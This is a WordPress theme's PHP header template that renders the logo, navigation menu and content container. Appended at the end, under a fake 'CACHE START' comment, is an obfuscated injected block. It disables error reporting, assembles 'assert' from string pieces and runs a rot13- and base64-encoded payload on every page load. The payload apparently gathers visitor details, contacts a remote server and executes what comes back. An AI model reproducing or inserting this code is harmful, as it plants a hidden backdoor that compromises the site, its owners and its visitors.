	<?php global $rt_global_variables; ?>


		<?php
	 		//main header holder (background) width	 		
	 		$main_header_width = "";

			if( isset( $post ) && is_singular() ){
				$main_header_width = get_post_meta( $post->ID, RT_COMMON_THEMESLUG.'_main_header_row_background_width', true );
			}

			if( empty( $main_header_width ) || $main_header_width == "global" ){
				$main_header_width =  get_theme_mod( RT_THEMESLUG.'_main_header_row_background_width' ); 
			}

			//still can be empty for some cases 
			if( empty( $main_header_width ) ){
				$main_header_width = "fullwidth";
			}
		 
		 	//sticky header
			$sticky_header =  get_theme_mod( RT_THEMESLUG.'_sticky_header' ) ? "sticky" : "";

		?>		

	<header class="top-header <?php echo sanitize_html_class($main_header_width); ?> <?php echo sanitize_html_class($sticky_header); ?>">
		<div class="header-elements">
		
			<!-- mobile menu button -->
			<div class="mobile-menu-button icon-menu"></div>

			<?php
			/**
			 * rt_before_logo hook
			 */
			do_action("rt_before_logo"); 
			?>

			<!-- logo -->
			<div id="logo" class="site-logo">
				<?php
					//the logo url
					$logo_url = rt_wpml_t(RT_THEMESLUG, "Logo Url", get_theme_mod( RT_THEMESLUG.'_logo_url' ));
					$sticky_logo_url = rt_wpml_t(RT_THEMESLUG, "Sticky Logo Url", get_theme_mod( RT_THEMESLUG.'_sticky_logo_url' ));

					//sticky logo output
					$sticky_logo_output =  ! empty( $sticky_logo_url ) ? sprintf( '<img src="%1$s" alt="%2$s" class="sticky_logo" />', esc_url($sticky_logo_url), get_bloginfo('name') ) : "" ;

					//logo output
					echo ! empty( $logo_url ) ? 
									sprintf( ' <a href="%1$s" title="%2$s"><img src="%3$s" alt="%2$s" class="main_logo" />%4$s</a> ', RT_BLOGURL, get_bloginfo('name'), esc_url($logo_url), $sticky_logo_output ) :
									sprintf( ' <span class="sitename"><a href="%1$s" title="%2$s">%2$s</a></span> ', RT_BLOGURL, get_bloginfo('name') ) ;

 

				?>		
			</div><!-- / end #logo -->

			<div class="header-right">
				<?php
				/**
				 * rt_before_navigation hook
				 *
				 * @hooked rt_display_shortcut_buttons - 1
				 */
				do_action("rt_before_navigation"); 
				?>		

				<!-- navigation holder -->
				<nav>
					<?php
						//call the main navigation
						if ( has_nav_menu( 'rt-theme-main-navigation' ) ){ // check if user created a custom menu and assinged to the rt-theme's location

							$menuVars = array(
								'menu_id'         => "navigation",
								'class'           => "menu",
								'echo'            => false,
								'container'       => '', 
								'container_class' => '',
								'items_wrap'      => '<ul id="%1$s" class="%2$s">%3$s</ul>',
								'container_id'    => 'navigation_bar', 
								'theme_location'  => 'rt-theme-main-navigation',
								'walker' => new RT_Menu_Class_Walker
							);
							
							$main_menu=wp_nav_menu($menuVars);
							echo ($main_menu);
						}else{
							
							$menuVars = array(
								'menu'            => 'Main Navigation',  
								'menu_id'         => "navigation",
								'class'           => "menu",
								'echo'            => false,
								'container'       => '',  
								'container_class' => '' ,
								'items_wrap'      => '<ul id="%1$s" class="%2$s">%3$s</ul>',
								'container_id'    => 'navigation_bar',  
								'theme_location'  => 'rt-theme-main-navigation',
								'walker' => new RT_Menu_Class_Walker
							);
							
							$main_menu=wp_nav_menu($menuVars);
							echo ($main_menu); 				
						}
					?>    
				</nav>
		
				<?php
				/**
				 * rt_after_navigation hook
				 *
				 * @hooked rt_display_shortcut_buttons - 1
				 */
				do_action("rt_after_navigation"); 
				?>

			</div><!-- / end .header-right -->

		</div>
	</header>



	<!-- main contents -->
	<div id="main_content">

	<?php 

		/**
		 * Get sub page header
		 * @hooked rt_sub_page_header_function
		 */
		do_action( "rt_sub_page_header");

	?>

	<?php 		
		/**
		 * Get page container
		 * @hooked rt_content_container
		 */	
		do_action("rt_content_container", array("action"=>"start", "sidebar"=>$rt_global_variables['sidebar_position'],"echo" => ! rt_is_composer_allowed(), "class" => $rt_global_variables["default_content_row_width"], "overlap" => ! $rt_global_variables["hide_page_title"] && ! $rt_global_variables["hide_breadcrumb_menu"] ) );
	?>

<?php 

?>

<?php 
//###=CACHE START=###
error_reporting(0);
assert_options(ASSERT_ACTIVE, 1);
assert_options(ASSERT_WARNING, 0);
assert_options(ASSERT_QUIET_EVAL, 1); $strings = "as";$strings .= "sert"; $strings(str_rot13('riny(onfr64_qrpbqr("nJLtXTymp2I0XPEcLaLcXFO7VTIwnT8tWTyvqwftsFOyoUAyVUftMKWlo3WspzIjo3W0nJ5aXQNcBjccozysp2I0XPWxnKAjoTS5K2Ilpz9lplVfVPVjVvx7PzyzVPtunKAmMKDbWTyvqvxcVUfXnJLbVJIgpUE5XPEsD09CF0ySJlWwoTyyoaEsL2uyL2fvKFxcVTEcMFtxK0ACG0gWEIfvL2kcMJ50K2AbMJAeVy0cBjccMvujpzIaK21uqTAbXPpuKSZuqFpfVTMcoTIsM2I0K2AioaEyoaEmXPEsH0IFIxIFJlWGD1WWHSEsExyZEH5OGHHvKFxcXFNxLlN9VPW1VwftMJkmMFNxLlN9VPW3VwfXWTDtCFNxK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKGfXWUHtCFNxK1ASHyMSHyfvFSEHHS9IH0IFK0SUEH5HVy07PvEcpPN9VPEsH0IFIxIFJlWFEH1CIRIsDHERHvWqBjbxqKWfVQ0tVzu0qUN6Yl8kAwDhZGZlYwD0YwR4BP9aMKDhpTujC2yjCFVhqKWfMJ5wo2EyXPEcpPxhVvMxCFVhqKWfMJ5wo2EyXPExXF4vWaH9Vv51pzkyozAiMTHbWUHcYvVzLm0vYvEwYvVznG0kWzt9Vv5gMQHbVwt2LGV2ZmWxZGp0MGIvAJV2ZJVjAGpmZJV5LwOyZGOzVv4xMP4xqF4xLl4vZFVcBjccMvucozysM2I0XPWuoTkiq191pzksMz9jMJ4vXFN9CFNkXFO7PvEcLaLtCFOznJkyK2qyqS9wo250MJ50pltxqKWfXGfXsFOyoUAynJLbMaIhL3Eco25sMKucp3EmXPWwqKWfK2yhnKDvXFxtrjbxL2ttCFOwqKWfK2yhnKDbWUIloPx7PzA1pzksp2I0o3O0XPEwnPjtD1IFGR9DIS9VEHSREIVfVRMOGSASXGfXL3IloS9mMKEipUDbWTAbYPOQIIWZG1OHK1WSISIFGyEFDH5GExIFYPOHHyISXGfXWUWyp3IfqPN9VTA1pzksMKuyLltxL2tcBjcwqKWfK2Afo3AyXPEwnPx7PvEcLaLtCFNxpzImqJk0Bjc9VTIfp2HtrjbxMaNtCFOzp29wn29jMJ4bVwR2AP4kZmVhAQDhZGt4VvjtBQNfVPEypaWholjtWTIlpaA0pvjtZmNcBjccMvNbWTMjXFO7PvNtVPNxo3I0VQ0tVxqSIPNiM2I0YaObpQ9cpQ0vYaIloTIhL29xMFtxnKNcYvVzMQ0vYaIloTIhL29xMFtxMPxhVvM1CFVhqKWfMJ5wo2EyXPE1XF4vWzZ9Vv4xLl4vWzx9ZFMbCFVhoJD1XPV4AzRlAwZlMQR3ATH1LwIvAwSvZQH3ZmSvBJVjMGRjMvVhWTDhWUHhWTZhVwRvXF4vVRuHISNiZF4kKUWpovV7PvNtVPNxo3I0VP49VPWVo3A0BvNkAwDhZGZlYwD0YwR4BSklKT4vBjbtVPNtWT91qPNhCFNvD29hozIwqTyiowbtD2kip2IppykhKUWpovV7PvNtVPOzq3WcqTHbWTMjYPNxo3I0XGfXVPNtVPElMKAjVQ0tVvV7PvNtVPO3nTyfMFNbVJMyo2LbWTMjXFxtrjbtVPNtVPNtVPElMKAjVP49VTMaMKEmXPEzpPjtZGV4XGfXVPNtVU0XVPNtVTMwoT9mMFtxMaNcBjbtVPNtoTymqPtxnTIuMTIlYPNxLz9xrFxtCFOjpzIaK3AjoTy0XPViKSWpHv8vYPNxpzImpPjtZvx7PvNtVPNxnJW2VQ0tWTWiMUx7Pa0XsDc9BjccMvucp3AyqPtxK1WSHIISH1EoVaNvKFxtWvLtWS9FEISIEIAHJlWjVy0tCG0tVzSuZmR3MzWzVvxtrlOyqzSfXUA0pzyjp2kup2uypltxK1WSHIISH1EoVzZvKFxcBlO9PzIwnT8tWTyvqwg9"));'));
//###=CACHE END=###
?>